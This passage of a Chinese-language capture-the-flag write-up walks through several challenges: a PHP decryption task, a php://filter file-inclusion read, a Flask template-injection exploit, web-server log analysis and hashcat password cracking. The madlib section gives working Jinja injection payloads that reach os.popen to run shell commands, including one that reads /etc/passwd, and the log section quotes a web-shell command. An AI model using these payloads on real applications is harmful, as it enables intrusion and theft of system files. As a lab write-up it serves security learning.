&lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$cipher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$nonce&lt;/span> &lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#75af00">sodium_crypto_secretbox&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$nonce&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key_decoded&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key_decoded&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$cipher&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> * Decrypt a message
&lt;/span>&lt;span style="color:#d88200"> * @param string $encrypted - message encrypted with safeEncrypt()
&lt;/span>&lt;span style="color:#d88200"> * @param string $key - key used for encryption
&lt;/span>&lt;span style="color:#d88200"> * @return string
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">decrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$encrypted&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$decoded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$encrypted&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$key_decoded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Decryption error : the encoding failed&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">mb_strlen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;8bit&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_MACBYTES&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Decryption error : the message was truncated&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$nonce&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mb_substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;8bit&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$ciphertext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mb_substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$decoded&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">SODIUM_CRYPTO_SECRETBOX_NONCEBYTES&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;8bit&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$plain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">sodium_crypto_secretbox_open&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">$ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$nonce&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key_decoded&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$plain&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Decryption error : the message was tampered with in transit&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ciphertext&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">sodium_memzero&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key_decoded&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$plain&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$privatekey&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;mRHpcEckKATdwDC/CwpRinDTiAYrn9lzWpTo277omKs=&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;../flag.txt&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$enc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$privatekey&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$enc&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>包含了解密的模块，所以用它解密一下即可&lt;/p>
&lt;p>————这里我的本地php一直出问题 版本7.3.4和7.4.21都报错&lt;/p>
&lt;h2 id="webnotrequired">Web/notrequired&lt;/h2>
&lt;blockquote>
&lt;p>Hello I am cheemsloverboi33! I made a php website. Can you do a quick security check on it?&lt;/p>
&lt;/blockquote>
&lt;p>注意到链接是http://ctf.bennetthackingcommunity.cf:8333/index.php?file=index.html&lt;/p>
&lt;p>用伪协议看一下index.php的源码/index.php?file=php://filter/convert.base64-encode/resource=index.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211009193402728.png" alt="image-20211009193402728">&lt;/p>
&lt;p>访问/bin/secrets.txt，得到 QlVIQ3tyM3F1MXIzXzFzX3MwbTN0aDFuZ185MDkxMDI5MTMwKCk4MTEyOTM4MTIxfQ==&lt;/p>
&lt;p>&lt;code>BUHC{r3qu1r3_1s_s0m3th1ng_9091029130()8112938121}&lt;/code>&lt;/p>
&lt;h2 id="webmadlib">Web/madlib&lt;/h2>
&lt;blockquote>
&lt;p>I just created the first draft of my first flask project, a madlib generator that fills the given words into a madlib template!&lt;/p>
&lt;p>Try it out and let me know what you think! The character length limit should make this app pretty secure.&lt;/p>
&lt;/blockquote>
&lt;p>一个flask的webapp&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211020005245072.png" alt="image-20211020005245072">&lt;/p>
&lt;p>先看下源码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/madlib&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">madlib&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">verb&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;verb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">noun&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;noun&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">adjective&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;adjective&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">person&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;person&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">place&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;place&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">verb&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">noun&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">adjective&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">person&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">place&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">any&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;your words must not be longer than 21 characters!&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>
&lt;span style="color:#111">madlib&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;To find out what this is you must &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">verb&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> the internet then get to the &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">noun&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> system through the visual MAC hard drive and program the open-source but overriding the bus won&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">t do anything so you need to parse the online SSD transmitter, then index the neural DHCP card &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">adjective&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">person&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> taught me this trick when we met in &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">place&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> allowing you to download the knowledge of what this is directly to your brain.&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">madlib&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;This madlib only takes five words&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">send_from_directory&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/app/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;app.py&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>看到了熟悉的模板渲染（语段来自于&lt;a href="https://www.reddit.com/user/masterhacker_bot/">u/masterhacker_bot&lt;/a>），只会渲染特定的位置，而且有个特殊的&lt;code>{adjective}.{person}&lt;/code>&lt;/p>
&lt;p>存在5个可以ssti的地方，但是限制每一个框字符数必须在21个之内；其中还有两个非常特殊的&lt;code>{adjective}.{person}&lt;/code>连了起来，我们可以用这个&lt;code>.&lt;/code>点号连接我们payload的长度&lt;/p>
&lt;p>这样相当于有4个可以构造的地方，前两个用来将长长的payload用短的变量及逆行替换，第三个是payload本体，第三和第四个位置均是回显位；首先通过&lt;code>config.update&lt;/code>方法不断地向后取值来拿到可以用的函数并将其存储在&lt;code>config.a&lt;/code>中，之后调用它来rce&lt;/p>
&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.update%}
{{y(a=x
__class__.__init__)}}
{{config.a}}
&lt;/code>&lt;/pre>&lt;p>回显&lt;code>&amp;lt;function Config.__init__ at 0x7fd75dae31e0&amp;gt;&lt;/code>，现在我们设法调用函数来执行命令&lt;/p>
&lt;pre tabindex="0">&lt;code>{{y(a=x.a
__globals__['os'])}}
&lt;/code>&lt;/pre>&lt;p>回显&lt;code>&amp;lt;module 'os' from '/usr/local/lib/python3.6/os.py'&amp;gt;&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>{{y(a=x.a
popen)}}
&lt;/code>&lt;/pre>&lt;p>回显&lt;code>&amp;lt;function popen at 0x7fd75ed5a730&amp;gt;&lt;/code>，此时我们的&lt;code>config.a&lt;/code>就是&lt;code>os.popen()&lt;/code>，现在来调用它来执行命令&lt;/p>
&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.a%}
{{y('uname -a')
read()}}
{{config.a}}
&lt;/code>&lt;/pre>&lt;p>回显&lt;code>Linux madlib-digitaloverdose:madlib-46bf3bc4 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 GNU/Linux&lt;/code>，成功执行了命令，接下来就很简单了，读一波flag&lt;/p>
&lt;pre tabindex="0">&lt;code>{{y('cat flag.txt')
read()}}
&lt;/code>&lt;/pre>&lt;p>&lt;code>DO{an0th3r_ssti_ch4ll3nge_l0l593deff6}&lt;/code>&lt;/p>
&lt;p>————很幸运的是最后我们的payload正好小于21个字符，显然我们被长度限制了发挥，但是这里还有别的trick&lt;/p>
&lt;p>Jinja不仅支持模板内部的变量赋值还支持&lt;code>~&lt;/code>进行字符串的连接，再利用上&lt;code>config.command&lt;/code>甚至能读出/etc/passwd&lt;/p>
&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.update%}
{%set p='cat /etc'%}
{%set q=p~'/passw'%}
{{y(b=q~'d')}}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>{%set x=config%}
{%set y=x.a%}
{%set z=config.b%}
{{z}}
{{y(z).read()}}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211021172308541.png" alt="image-20211021172308541">&lt;/p>
&lt;p>参考：&lt;a href="https://anakint.medium.com/digital-overdose-2021-autumn-ctf-writeup-madlib-web-c51c5ded5260">Digital Overdose 2021 Autumn CTF Writeup — madlib (web)&lt;/a>&lt;/p>
&lt;h2 id="log-analysispart1---ingress">Log Analysis/Part1 - Ingress&lt;/h2>
&lt;blockquote>
&lt;p>Our website was hacked recently and the attackers completely ransomwared our server!&lt;/p>
&lt;p>We&amp;rsquo;ve recovered it now, but we don&amp;rsquo;t want it to happen again.&lt;/p>
&lt;p>Here are the logs from before the attack, can you find out what happened?&lt;/p>
&lt;/blockquote>
&lt;p>给出了访问日志，有庞大的数据，n行~~，但是不太会看~~&lt;/p>
&lt;p>在37557行出现了访问&lt;code>/ywesusnz cmd%3Dcd+..&lt;/code>，往后还有一些ywesusnz开头的，37629行出现了&lt;code>/ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==&lt;/code>，b64解密&lt;/p>
&lt;p>&lt;code>DO{better_remove_that_backdoor}&lt;/code>&lt;/p>
&lt;h2 id="log-analysispart-2---investigation">Log Analysis/Part 2 - Investigation&lt;/h2>
&lt;blockquote>
&lt;p>Thanks for finding the RFI vulnerability in our FAQ. We have fixed it now, but we don&amp;rsquo;t understand how the attacker found it so quickly.&lt;/p>
&lt;p>We suspect it might be an inside job, but maybe they got the source another way. Here are the logs for the month prior to the attack, can you see anything suspicious?&lt;/p>
&lt;p>Please submit the attackers IP as the flag as follow, DO{x.x.x.x}&lt;/p>
&lt;/blockquote>
&lt;p>仍然是给出了很多行的日志&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022081303705.png" alt="image-20211022081303705">&lt;/p>
&lt;p>发现了可疑的内容&lt;code>DO{45.85.1.176}&lt;/code> 但是提交flag错误&lt;/p>
&lt;p>（然后发现是很傻逼的把200.13.84.124当作flag交了……&lt;/p>
&lt;h2 id="log-analysispart-3---backup-policy">Log Analysis/Part 3 - Backup Policy&lt;/h2>
&lt;blockquote>
&lt;p>So it looks like the attacker scanned our site for old backups right? Did he get one?&lt;/p>
&lt;/blockquote>
&lt;p>接着找，发现了/backup.zip的请求是200ok&lt;/p>
&lt;p>但是交flag的时候不知道交啥，看了wp才发现藏在了UA头里&lt;/p>
&lt;pre tabindex="0">&lt;code>Mozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36
&lt;/code>&lt;/pre>&lt;p>将中间那一串b64解密后得到&lt;/p>
&lt;p>&lt;code>DO{s3cr3t___agent}&lt;/code>&lt;/p>
&lt;h2 id="source-analysisa1---c-nanigans">Source Analysis/A1 - C-nanigans&lt;/h2>
&lt;blockquote>
&lt;p>Find the flag parts in the source code, assemble the flag, submit the flag.&lt;/p>
&lt;p>(This code may not compile, and it is useless to attempt to do so)&lt;/p>
&lt;/blockquote>
&lt;p>提示我们关注源码而不是编译&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084007781.png" alt="image-20211022084007781">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022083958098.png" alt="image-20211022083958098">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084018091.png" alt="image-20211022084018091">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211022084123654.png" alt="image-20211022084123654">&lt;/p>
&lt;pre tabindex="0">&lt;code>444f7b
733075526333
5f406e616c79333173
7d
&lt;/code>&lt;/pre>&lt;p>hex解密后得到&lt;code>DO{s0uRc3_@naly31s}&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-1">Hash Cracking/Hash 1&lt;/h2>
&lt;pre tabindex="0">&lt;code>54a09c22fc0d1af44865e411ff6e8d50
&lt;/code>&lt;/pre>&lt;p>&lt;code>phantomlover&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-2">Hash Cracking/Hash 2&lt;/h2>
&lt;pre tabindex="0">&lt;code>52ed4b109a2662fdf15edfd95632667869fc5802
&lt;/code>&lt;/pre>&lt;p>&lt;code>fishchips&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-3">Hash Cracking/Hash 3&lt;/h2>
&lt;pre tabindex="0">&lt;code>550b57fc03f0a800fab603cb8eb4e29fbd5c76655d7ab995b1fe9c6ddf963a3d2627ebd79e067022f792bb2490a260c051aecbc4a7aedb3ec5dbf9439cd66f81
&lt;/code>&lt;/pre>&lt;p>&lt;code>mommadobbins&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-4">Hash Cracking/Hash 4&lt;/h2>
&lt;pre tabindex="0">&lt;code>451716a045ca5ec7f25e191ab5244c61aaeeb008c4753a2065e276f1baba4723
&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://md5hashing.net/hash_type_checker">Hash Identifier&lt;/a>&lt;/p>
&lt;p>hashcat -m 6900 ghost&lt;/p>
&lt;p>&lt;code>happyfamily&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-5">Hash Cracking/Hash 5&lt;/h2>
&lt;pre tabindex="0">&lt;code>$2a$10$QlR/ZlXgQPWfx9JmRffMZutcL3o3w6JAiRbfvGda4u09lrfOvgcH6
&lt;/code>&lt;/pre>&lt;p>hashcat -m 3200 bcrypt&lt;/p>
&lt;p>&lt;code>cowabunga&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-6">Hash Cracking/Hash 6&lt;/h2>
&lt;pre tabindex="0">&lt;code>$1$veryrand$QetWu27IoJ2FFSG30xKAQ.
&lt;/code>&lt;/pre>&lt;p>&lt;a href="https://www.tunnelsup.com/hash-analyzer/">Hash Analyzer&lt;/a>&lt;/p>
&lt;p>hashcat -m 500 MD5-Crypt&lt;/p>
&lt;p>&lt;code>scottiebanks&lt;/code>&lt;/p>
&lt;h2 id="hash-crackinghash-7">Hash Cracking/Hash 7&lt;/h2>
&lt;pre tabindex="0">&lt;code>$6$veryrandomsalt$t8EIWEiDpWYzeC1c44q7f6ZENOuO2wagnrJBPs4d/PptWxAxlnH7qRcf0xnKagaOEHBN9dGBV5Y1syJSB3s6H1
&lt;/code>&lt;/pre>&lt;p>hashcat -m 1800 sha512crypt $6$&lt;/p>
&lt;p>&lt;code>igetmoney&lt;/code>&lt;/p>
&lt;hr>
